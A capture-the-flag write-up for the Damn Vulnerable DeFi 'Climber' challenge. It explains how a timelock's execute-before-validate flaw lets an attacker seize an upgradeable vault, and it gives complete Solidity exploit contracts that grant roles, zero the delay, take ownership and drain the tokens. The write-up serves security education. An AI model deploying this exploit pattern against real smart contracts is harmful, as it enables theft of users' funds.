# Climber

There’s a secure vault contract guarding 10 million DVT tokens. The vault is upgradeable, following the [UUPS pattern](https://eips.ethereum.org/EIPS/eip-1822).

The owner of the vault is a timelock contract. It can withdraw a limited amount of tokens every 15 days.

On the vault there’s an additional role with powers to sweep all tokens in case of an emergency.
(IDK why but am getting some bad smell here)

On the timelock, only an account with a “Proposer” role can schedule actions that can be executed 1 hour later.(Here is actions written in plural kinda doubtins stuff right let's see...)

You must rescue all tokens from the vault and deposit them into the designated recovery account.


# Challenge overview

[official site](https://damnvulnerabledefi.xyz/challenges/climber)  
I am trying to reduce fluffs and indirect stuffs as much as posible

## Let’s dive

The Climber challenge is the 12th level in the Damn Vulnerable DeFi V4 series. The goal is simple: Drain all the DVT tokens from the pool.

> Note : This solution is gonna be little harder than preious ones, You need to deploy your own implemntation contract. So, be calm and try to catch as much information as you can.

Okay! I am assuming that you have already visited the every line in the codebase. If not please go back and finish it. If you have finished, let's start! The main flaw stays at execute function(of course coz it is the only function having relation with transfers and other money stuffs). The main cause of the vulnerability is "execute first, validate later" . It creates a critical vulnerability where an attacker can manipulate the contract’s state during execution to make the validation check pass.


### Exploit flow :
1) Construct a malicious operation that includes multiple function calls:
- Grant PROPOSER_ROLE to the attacker’s contract
- Set the timelock delay to 0
- Transfer ownership of the vault to the attacker’s contract
- Schedule this same operation through the attacker’s contract
2) Call the timelock’s execute() function with these operations
3) After gaining ownership of the vault, deploy a malicious implementation contract
4) Upgrade the vault implementation using the UUPS pattern
5) Call a custom function in the new implementation to drain all tokens


## POC

Now, before going to the POC you should try to write exploit yourself and if you get errors and confusions here is the POC:

```solidity
    contract Attacker {
        
        ClimberVault vault;
        ClimberTimelock timelock;
        DamnValuableToken token;
        address recovery;
        address[] targets = new address[](4);
        uint256[] values = new uint256[](4);
        bytes[] dataElements = new bytes[](4);

        constructor(
            ClimberVault _vault,
            ClimberTimelock _timelock,
            DamnValuableToken _token,
            address _recovery
        ) {
            vault = _vault;
            timelock = _timelock;
            token = _token;
            recovery = _recovery;
        }

        function attack() external {
            
            address maliciousImpl = address(new MaliciousVault());

            bytes memory grantRoleData = abi.encodeWithSignature(
                "grantRole(bytes32,address)",
                keccak256("PROPOSER_ROLE"),
                address(this)
            );

            bytes memory changeDelayData = abi.encodeWithSignature(
                "updateDelay(uint64)",
                uint64(0)
            );

            bytes memory transferOwnershipData = abi.encodeWithSignature(
                "transferOwnership(address)",
                address(this)
            );

            bytes memory scheduleData = abi.encodeWithSignature(
                "timelockSchedule()"
            );
        
            targets[0] = address(timelock);
            values[0] = 0;
            dataElements[0] = grantRoleData;

            targets[1] = address(timelock);
            values[1] = 0;
            dataElements[1] = changeDelayData;

            targets[2] = address(vault);
            values[2] = 0;
            dataElements[2] = transferOwnershipData;

            targets[3] = address(this);
            values[3] = 0;
            dataElements[3] = scheduleData;

            timelock.execute(
                targets,
                values,
                dataElements,
                bytes32(0)
            );

            vault.upgradeToAndCall(address(maliciousImpl), "");
            MaliciousVault(address(vault)).drainFunds(address(token), recovery);
        }

        function timelockSchedule() external {
            timelock.schedule(targets, values, dataElements, bytes32(0));
        }
    }
```

## Implementation contract
```solidity
contract MaliciousVault is Initializable, OwnableUpgradeable, UUPSUpgradeable {
    uint256 private _lastWithdrawalTimestamp;
    address private _sweeper;

    /// @custom:oz-upgrades-unsafe-allow constructor
    constructor() {
        _disableInitializers();
    }

    function drainFunds(address token, address receiver) external {
        SafeTransferLib.safeTransfer(token, receiver, IERC20(token).balanceOf(address(this)));
    }

    function _authorizeUpgrade(address newImplementation) internal override onlyOwner {}
}
```

Hmm your code inside test contract should look like this 
```solidity
    /**
     * CODE YOUR SOLUTION HERE
     */
    function test_climber() public checkSolvedByPlayer {
        Attacker attacker = new Attacker(vault, timelock, token, recovery);
        attacker.attack();
    } 
```

>Okay! This Much 

### If you found this write up useful give a star to the **[repo](https://github.com/0xscarfac3/damnvulnerabledefi-v4-solutions)** and don't forget to follow your buddy **[0xscarfac3](https://github.com/0xscarfac3)**